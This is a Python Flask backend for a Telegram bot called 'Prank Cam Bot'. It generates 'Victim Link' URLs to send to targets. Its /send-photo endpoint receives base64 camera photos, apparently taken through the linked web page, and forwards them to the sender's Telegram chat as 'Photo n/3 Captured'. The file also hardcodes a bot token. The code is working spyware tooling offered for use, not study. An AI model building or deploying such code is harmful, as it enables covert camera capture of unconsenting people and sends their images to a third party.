from flask import Flask, request, jsonify
import requests
import base64
from io import BytesIO
import uuid

app = Flask(__name__)

TOKEN = "8759505136:AAGAVvvts52UJcto01hnAJsv8B4U_1y7orU"
WEB_APP_BASE_URL = "https://prank-cam-bot.vercel.app"

@app.route('/', methods=['GET'])
def home():
    return "<h1>✅ Prank Cam Bot Backend Running!</h1>"

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        update = request.get_json(silent=True, force=True)
        if not update or 'message' not in update:
            return jsonify({"status": "ok"})

        message = update['message']
        chat_id = message.get('chat', {}).get('id')
        text = message.get('text', '').strip().lower()

        if text == '/start':
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                          json={"chat_id": chat_id, "text": "🎉 Camera Prank Bot Ready!\nUse /generate"})

        elif text == '/generate':
            unique_id = str(uuid.uuid4())[:8]
            link = f"{WEB_APP_BASE_URL}/?chat_id={chat_id}&id={unique_id}"
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                          json={
                              "chat_id": chat_id,
                              "text": f"🔥 Victim Link Ready!\n\n{link}",
                              "reply_markup": {"inline_keyboard": [[{"text": "📸 Send to Victim", "url": link}]]}
                          })
        return jsonify({"status": "ok"})
    except:
        return jsonify({"status": "ok"})

@app.route('/send-photo', methods=['POST'])
def send_photo():
    try:
        data = request.get_json(silent=True, force=True)
        chat_id = data.get('chat_id')
        photo_base64 = data.get('photo')
        num = data.get('number', 1)

        if not chat_id or not photo_base64:
            return jsonify({"error": "missing data"}), 400

        header, imgstr = photo_base64.split(',', 1)
        photo_bytes = base64.b64decode(imgstr)

        files = {'photo': ('photo.jpg', BytesIO(photo_bytes), 'image/jpeg')}
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
            data={'chat_id': chat_id, 'caption': f"📸 Photo {num}/3 Captured! 😂"},
            files=files
        )
        return jsonify({"status": "sent"})
    except:
        return jsonify({"error": "failed"}), 500

if __name__ == "__main__":
    app.run()
